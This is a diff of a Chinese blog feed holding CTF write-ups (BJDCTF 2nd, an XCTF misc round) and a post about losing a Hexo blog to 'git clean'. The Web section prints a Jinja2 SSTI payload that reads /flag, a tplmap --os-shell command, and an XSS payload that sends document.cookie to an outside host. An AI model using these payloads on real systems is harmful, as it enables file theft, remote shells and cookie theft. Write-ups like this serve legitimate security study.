 <h3 id="Real-EasyBaBa"><a href="#Real-EasyBaBa" class="headerlink" title="Real_EasyBaBa"></a>Real_EasyBaBa</h3><p>思路：010里面看flag形状（抽象带师。。</p>
 <p>打开010，往下拉</p>
-<a href="/2020/03/21/BJDCTF-2nd-wp/10.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/03/21/BJDCTF-2nd-wp/10.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/03/21/BJDCTF-2nd-wp/10.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>得到flag：<code>BJD{572154976}</code></p>
 <h3 id="圣火昭昭-y1ng"><a href="#圣火昭昭-y1ng" class="headerlink" title="圣火昭昭-y1ng"></a>圣火昭昭-y1ng</h3><p>思路：新佛曰+outguess隐写</p>
 <p>看属性发现新佛曰，<a href="http://hi.pcmoe.net/buddha.html" target="_blank" rel="noopener">解码</a>一下（得到key：gemlove，题目提示去掉com</p>
-<a href="/2020/03/21/BJDCTF-2nd-wp/11.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/11.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/11.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>然后根据题目hint：<code>开局一张图，flag全靠猜</code>     暗示outguess隐写</p>
 <p>其实刚开始我没理解这意思，然后用stegdetect扫<code>error: Quantization table 0x00 was not defined</code></p>
 <p>打开010看一下，发现大量00，20明示outguess隐写</p>
-<a href="/2020/03/21/BJDCTF-2nd-wp/12.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/12.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/12.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>解出来得到flag：<code>BJD{wdnmd_misc_1s_so_Fuck1ng_e@sy}</code></p>
 <h3 id="TARGZ-y1ng"><a href="#TARGZ-y1ng" class="headerlink" title="TARGZ-y1ng"></a>TARGZ-y1ng</h3><p>思路：文件名为压缩包密码，多层压缩包解密</p>
@@ -663,15 +685,15 @@
 <p>base64解码得到flag：<code>BJD{W3lc0me_T0_BJDCTF}</code></p>
 <h3 id="老文盲了"><a href="#老文盲了" class="headerlink" title="老文盲了"></a>老文盲了</h3><p>这题给爷整笑了，百度翻译读一下</p>
 <p>去掉BJD{}对应的字，得到flag：<code>BJD{淛匶襫黼瀬鎶軄鶛驕鳓哵}</code></p>
-<h3 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat_flag"></a>cat_flag</h3><a href="/2020/03/21/BJDCTF-2nd-wp/13.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/13.gif" src="/img/loading.gif" class="lazyload"></a>
+<h3 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat_flag"></a>cat_flag</h3><a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/13.gif" src="/img/loading.gif" class="lazyload"></a>
 
 <p>拿🍙的是0，拿🍗的是1，翻译一下，二进制转ASCII</p>
 <p>得到flag：<code>BJD{M!a0~}</code></p>
-<h3 id="灵能精通-y1ng"><a href="#灵能精通-y1ng" class="headerlink" title="灵能精通-y1ng"></a>灵能精通-y1ng</h3><a href="/2020/03/21/BJDCTF-2nd-wp/14.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/03/21/BJDCTF-2nd-wp/14.png" src="/img/loading.gif" class="lazyload"></a>
+<h3 id="灵能精通-y1ng"><a href="#灵能精通-y1ng" class="headerlink" title="灵能精通-y1ng"></a>灵能精通-y1ng</h3><a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/03/21/BJDCTF-2nd-wp/14.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>圣堂武士密码，翻译一哈，flag：<code>BJD{IMKNIGHTSTEMPLAR}</code></p>
 <h3 id="燕言燕语"><a href="#燕言燕语" class="headerlink" title="燕言燕语"></a>燕言燕语</h3><p>16进制转ASCII+维吉尼亚密码</p>
-<a href="/2020/03/21/BJDCTF-2nd-wp/16.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/16.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/16.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>得到flag：<code>bjd{yanzi_jiushige_shabi}</code></p>
 <h3 id="Y1nglish-y1ng"><a href="#Y1nglish-y1ng" class="headerlink" title="Y1nglish-y1ng"></a>Y1nglish-y1ng</h3><p>本来以为这题是词频分析，然后直接上脚本，还把字母顺序和最常出现字母顺序对应了一下，然并卵</p>
@@ -680,7 +702,7 @@
 <p>最后得到flag：<code>BJD{pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4ck}</code></p>
 <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="fake-google"><a href="#fake-google" class="headerlink" title="fake google"></a>fake google</h3><p>SSTI模板注入 （jinjia2</p>
 <p>随意输一个数字在网页源代码出看到提示ssssssti，然而并不会…..</p>
-<a href="/2020/03/21/BJDCTF-2nd-wp/17.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/21/BJDCTF-2nd-wp/17.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/21/BJDCTF-2nd-wp/17.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>根据<a href="https://www.1p0ch.cn" target="_blank" rel="noopener">王牌辅助楠子神</a>给的提示，搜SSTI模板注入，大概看懂了点，讲也讲不出来，直接放payload</p>
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">markdown</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">qaq?name=&#123;&#123;().<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">177</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>.<span class="strong">__builtins__</span>[<span class="string">'open'</span>](<span class="link">'/flag'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure></div>
@@ -692,18 +714,18 @@
 </blockquote>
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./tplmap.py -u http://9df44046-64a1-4ab3-b167-6e2bca4fe272.node3.buuoj.cn/qaq?name= --os-shell</span><br></pre></td></tr></table></figure></div>
 
-<a href="/2020/03/21/BJDCTF-2nd-wp/22.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/21/BJDCTF-2nd-wp/22.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/21/BJDCTF-2nd-wp/22.png" src="/img/loading.gif" class="lazyload"></a>
 
 <h3 id="old-hack"><a href="#old-hack" class="headerlink" title="old-hack"></a>old-hack</h3><p>网站提示：Power By thinkphp5</p>
 <p>随便输入一个s参数，报错如下</p>
-<a href="/2020/03/21/BJDCTF-2nd-wp/20.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/21/BJDCTF-2nd-wp/20.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/21/BJDCTF-2nd-wp/20.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>得到tp版本，网上搜一下<a href="https://blog.csdn.net/qq_38807738/article/details/86777541" target="_blank" rel="noopener">5.0.23</a>的漏洞，可以直接用的，得到flag</p>
-<a href="/2020/03/21/BJDCTF-2nd-wp/21.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/21/BJDCTF-2nd-wp/21.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/21/BJDCTF-2nd-wp/21.png" src="/img/loading.gif" class="lazyload"></a>
 
 <h3 id="duangShell"><a href="#duangShell" class="headerlink" title="duangShell"></a>duangShell</h3><p>开始是个vim文件泄露，而且没走寻常路，dirsearch也没扫出来</p>
 <p>备份文件在/.index.php.swp里，vim -r  恢复一下</p>
-<a href="/2020/03/21/BJDCTF-2nd-wp/18.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/21/BJDCTF-2nd-wp/18.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/21/BJDCTF-2nd-wp/18.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>起初以为是个RCE，绕倒是不难，但是它没回显。。</p>
 <p>于是就开始了我漫长的，弹shell之路。试过bash，python，curl，perl，nc…..</p>
@@ -723,16 +745,16 @@
 <p>列出从客户端到 OCS 或者相反方向的响应经过了哪些代理服务器，他们用什么协议（和版本）发送的请求。当客户端请求到达第一个代理服务器时，该服务器会在自己发出的请求里面添加 Via 头部，并填上自己的相关信息，当下一个代理服务器 收到第一个代理服务器的请求时，会在自己发出的请求里面复制前一个代理服务器的请求的Via 头部，并把自己的相关信息加到后面， 以此类推，当 OCS 收到最后一个代理服务器的请求时，检查 Via 头部，就知道该请求所经过的路由。</p>
 </blockquote>
 <p>再开环境做了一遍得到flag</p>
-<a href="/2020/03/21/BJDCTF-2nd-wp/19.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/03/21/BJDCTF-2nd-wp/19.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/03/21/BJDCTF-2nd-wp/19.png" src="/img/loading.gif" class="lazyload"></a>
 
 <h3 id="XSS之光"><a href="#XSS之光" class="headerlink" title="XSS之光"></a>XSS之光</h3><p>Git源码泄露，反序列化，xss</p>
 <p>开局  gungungun  老祖安人了，查看源码啥也没有，扫一下目录，发现Git泄露</p>
-<a href="/2020/03/21/BJDCTF-2nd-wp/23.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/03/21/BJDCTF-2nd-wp/23.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/03/21/BJDCTF-2nd-wp/23.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>提示有xss漏洞，利用php原生类构造payload</p>
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = serialize(<span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"&lt;script&gt;window.location.href='http://b9c4633b-9ce6-4937-8b9f-a1b02de9a086.node3.buuoj.cn/'+document.cookie&lt;/script&gt;"</span>));</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure></div>
 
-<a href="/2020/03/21/BJDCTF-2nd-wp/24.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/03/21/BJDCTF-2nd-wp/24.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/03/21/BJDCTF-2nd-wp/24.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>在cookie中得到url编码的flag，解码后得到flag</p>
 <p>&nbsp;</p>
@@ -744,9 +766,9 @@
       </categories>
       <tags>
         <tag>Write_up</tag>
-        <tag>Web</tag>
-        <tag>misc</tag>
         <tag>Crypto</tag>
+        <tag>misc</tag>
+        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
@@ -758,7 +780,7 @@
 <p>早上起来的时候发现签到题和一道misc已经被做了，伤心！（web是不敢想的，也就水水misc。。</p>
 <h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><h4 id="简单misc"><a href="#简单misc" class="headerlink" title="简单misc"></a>简单misc</h4><p>思路：文件头修复+文件分离+摩斯密码+base64</p>
 <p>用winhex或者010editor或者hxd打开文件，修复文件头为FFD8</p>
-<a href="/2020/03/09/xctf-misc-wp/1.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="30%" height="30%" data-src="/2020/03/09/xctf-misc-wp/1.jpg" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="30%" height="30%" data-src="/2020/03/09/xctf-misc-wp/1.jpg" src="/img/loading.gif" class="lazyload"></a>
 
 <p>好像并没有什么有用的信息，搜一下文件尾FFD9，发现后面有个压缩包</p>
 <p>手动提取也行，binwalk也行，foremost也行（最近爱上了手撕，因为不用往linux里放了</p>
@@ -769,21 +791,21 @@
 <p>&nbsp;</p>
 <h4 id="隐藏的信息"><a href="#隐藏的信息" class="headerlink" title="隐藏的信息"></a>隐藏的信息</h4><p>反色二维码补全扫码+伪加密+频谱图(高群、低群)电话音分析+base64加密</p>
 <p>把二维码里面反色一下，补上三个定位点</p>
-<a href="/2020/03/09/xctf-misc-wp/2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/09/xctf-misc-wp/2.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/09/xctf-misc-wp/2.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>扫出来是：<code>flag{this_is_also_not_flag} 解压密码不在这里0.0！</code></p>
 <p>并没有什么卵用，然后还在二维码那张图片里发现了这个</p>
-<a href="/2020/03/09/xctf-misc-wp/3.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/09/xctf-misc-wp/3.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/09/xctf-misc-wp/3.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>应该是找出隐藏的信息后base64加密（后面是TOGETYOUFLAG</p>
 <p>然后就是那个纯数字的压缩包，我从1位爆破到10位后，感觉不对劲</p>
-<a href="/2020/03/09/xctf-misc-wp/4.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="10%" height="10%" data-src="/2020/03/09/xctf-misc-wp/4.jpg" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="10%" height="10%" data-src="/2020/03/09/xctf-misc-wp/4.jpg" src="/img/loading.gif" class="lazyload"></a>
 
 <p>再高位数跑完怕不是比赛都结束了，放进010一看，淦，伪加密</p>
 <p>解开后得到一个音频，放进Audacity看一下，发现正巧是前几天看的<a href="https://www.ichunqiu.com/course/61665" target="_blank" rel="noopener">视频</a>里的（拨号音</p>
-<p><a href="/2020/03/09/xctf-misc-wp/5.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/09/xctf-misc-wp/5.png" src="/img/loading.gif" class="lazyload"></a><a href="/2020/03/09/xctf-misc-wp/5.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/09/xctf-misc-wp/5.png" src="/img/loading.gif" class="lazyload"></a></p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/09/xctf-misc-wp/5.png" src="/img/loading.gif" class="lazyload"></a><a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/09/xctf-misc-wp/5.png" src="/img/loading.gif" class="lazyload"></a></p>
 <p>手解一下</p>
-<a href="/2020/03/09/xctf-misc-wp/7.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/03/09/xctf-misc-wp/7.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/03/09/xctf-misc-wp/7.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>得到一串数字：<code>187485618521</code>，base64加密一下得到flag</p>
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MTg3NDg1NjE4NTIx</span><br></pre></td></tr></table></figure></div>
@@ -798,32 +820,32 @@
 <p>发现是32位的winxp，列一下进程(pslist无法显示隐藏/终止进程，可以用插件psscan解决</p>
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f data.vmem --profile=WinXPSP2x86 pslist</span><br></pre></td></tr></table></figure></div>
 
-<a href="/2020/03/09/xctf-misc-wp/8.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/09/xctf-misc-wp/8.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/09/xctf-misc-wp/8.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>当时关键进程抓错了。。没分析IE（一生之敌）。。直接去提取cmd和conime的进程，然后去扫flag字符串</p>
 <p>陷进去的时候，那道题已经被解出来了，然后就不想做了。。（小白还是小白。。</p>
 <p>关键进程应该是explorer.exe和cmd.exe</p>
 <p>先去提取内存中保留的 cmd 命令使用情况</p>
-<a href="/2020/03/09/xctf-misc-wp/10.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/09/xctf-misc-wp/10.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/09/xctf-misc-wp/10.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>发现passwd：<code>weak_auth_top100</code></p>
 <p>然后用iehistory查看ie浏览器使用情况发现没有信息，于是用editbox查看输入框信息</p>
-<a href="/2020/03/09/xctf-misc-wp/9.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/09/xctf-misc-wp/9.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/09/xctf-misc-wp/9.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>发现ie访问的地址是 “C:\Documents and Settings\Administrator”</p>
 <p>于是用filescan搜索文件，grep过滤包含<code>Administrator</code>的地址</p>
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f data.vmem --profile=WinXPSP2x86 filescan | grep <span class="string">"Administrator"</span></span><br></pre></td></tr></table></figure></div>
 
-<a href="/2020/03/09/xctf-misc-wp/11.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/09/xctf-misc-wp/11.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/09/xctf-misc-wp/11.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>发现flag.img，提取出来</p>
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f data.vmem --profile=WinXPSP2x86 dumpfiles -Q 0x0000000001155f90 -n --dump-dir=./</span><br></pre></td></tr></table></figure></div>
 
-<a href="/2020/03/09/xctf-misc-wp/12.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/03/09/xctf-misc-wp/12.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/03/09/xctf-misc-wp/12.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>其实当时我也过滤了好多。。但是过滤的都是zip、rar、png、jpg、txt、pacp啥的。。没想过img文件（其实过滤flag也行</p>
 <p>得到文件file.None.0xff425090.dat，修改后缀为img，把里面的东西提取一下</p>
-<a href="/2020/03/09/xctf-misc-wp/13.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/03/09/xctf-misc-wp/13.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/03/09/xctf-misc-wp/13.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>得到一个加密的压缩包，密码就是<code>weak_auth_top100</code>（我还以为是弱口令爆破，试了两组后就放弃了</p>
 <p>解压得到usbdata.txt ，网上有脚本可以分析，贴个<a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9473808.html" target="_blank" rel="noopener">网址</a>，大佬分析的挺全面的</p>
@@ -834,17 +856,17 @@
 <p>提取到flag.exe就不会了，IDA分析不会。。运行的时候倒是发现六个输入接回车后会输出一些无规则字符。。</p>
 <p>赛后讨论的时候才知道加了个VMP壳？。。</p>
 <p>然后群里的师傅发现了这个</p>
-<a href="/2020/03/09/xctf-misc-wp/15.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/09/xctf-misc-wp/15.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/09/xctf-misc-wp/15.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>还有这个</p>
-<a href="/2020/03/09/xctf-misc-wp/15.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/09/xctf-misc-wp/15.jpg" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/09/xctf-misc-wp/15.jpg" src="/img/loading.gif" class="lazyload"></a>
 
 <p>misc新题型解锁：开心猜猜猜！</p>
 <p>最后我：</p>
-<a href="/2020/03/09/xctf-misc-wp/16.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/09/xctf-misc-wp/16.jpg" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/09/xctf-misc-wp/16.jpg" src="/img/loading.gif" class="lazyload"></a>
 
 <p>二更：官方wp</p>
-<a href="/2020/03/09/xctf-misc-wp/17.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/09/xctf-misc-wp/17.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/09/xctf-misc-wp/17.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>其中用steghide爆破的密码为：ctf</p>
 <p>u1s1，还不如去猜flag……..</p>
@@ -871,7 +893,7 @@
 <p>此时问题出现了，网站内容没更新！！！</p>
 <p>再刷新几次试试。。。还是没有！！！！</p>
 <p>回来再部署一次！一定是姿势不对！</p>
-<a href="/2020/03/07/A-painful-experience/5.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="10%" height="10%" data-src="/2020/03/07/A-painful-experience/5.jpg" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="10%" height="10%" data-src="/2020/03/07/A-painful-experience/5.jpg" src="/img/loading.gif" class="lazyload"></a>
 
 <p>淦！！为啥还是没有，研究一下hexo d之后的内容。。</p>
 <p>“Branch ‘master’ set up to track remote branch ‘master’ from”？？？？？？</p>
@@ -881,25 +903,25 @@
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clean -f -d</span><br></pre></td></tr></table></figure></div>
 
 <p>就是它！！就是它！！它摧毁了我的hexo，它删掉了我辛辛苦苦配置了很久的next和butterfly</p>
-<a href="/2020/03/07/A-painful-experience/1.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="15%" height="15%" data-src="/2020/03/07/A-painful-experience/1.jpg" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="15%" height="15%" data-src="/2020/03/07/A-painful-experience/1.jpg" src="/img/loading.gif" class="lazyload"></a>
 
 <p>第一反应woc！！！赶紧去回收站看看，有救没？？有救没？？？</p>
 <p>没有了！！！5555草5555！！！</p>
 <p>于是悲伤地卸掉hexo打算重新来过</p>
-<a href="/2020/03/07/A-painful-experience/3.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:80%;" data-src="/2020/03/07/A-painful-experience/3.jpg" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:80%;" data-src="/2020/03/07/A-painful-experience/3.jpg" src="/img/loading.gif" class="lazyload"></a>
 
 <p>但是再下下来后，发现hexo s连TM自己本地的4000端口都看不来了！！（急了急了脑子没了</p>
 <p>那时候已经一点多了，我悲伤地发出了一篇纪念我短暂博客生涯的说说</p>
 <p>那时已经在看Ghost怎么搭建了（但是说真的还是放不下hexo，作业那么多，也没有重头再来的勇气了</p>
 <p>这时一位学姐的评论，又让我看到blog转生的希望</p>
-<a href="/2020/03/07/A-painful-experience/4.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/07/A-painful-experience/4.jpg" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/07/A-painful-experience/4.jpg" src="/img/loading.gif" class="lazyload"></a>
 
 <p>DiskGenius文件数据恢复工具，然后就去扫我的磁盘</p>
 <p>但是有用的只找到了一部分，很多都丢了（像styl文件、yml文件</p>
 <p>比较惊喜的还是把自己之前发博客写的md文件找到了（很重要，没这个我贼难受，懒得copy了</p>
 <p>这时时间来到了3点多钟，我不甘心的睡下了，仿佛看开了，其实脑子里全都是</p>
 <p>“Branch ‘master’ set up to track remote branch ‘master’ from”。。。。。。。。。</p>
-<a href="/2020/03/07/A-painful-experience/6.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/07/A-painful-experience/6.jpg" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/07/A-painful-experience/6.jpg" src="/img/loading.gif" class="lazyload"></a>
 
 <p>时间来到了今天，早上爬起来水了道战疫的misc后。。</p>
 <p>淦！我不甘心！爷要从头开始！！！（md，要不是这事，我OS实验一应该写的差不多了</p>
@@ -907,11 +929,11 @@
 <p>hexo clean g d。。！！？？还是之前的样子？？？？</p>
 <p>这次又去研究了下分叉，切到.deploy<code>git branch -a</code>。。。就一个master呀</p>
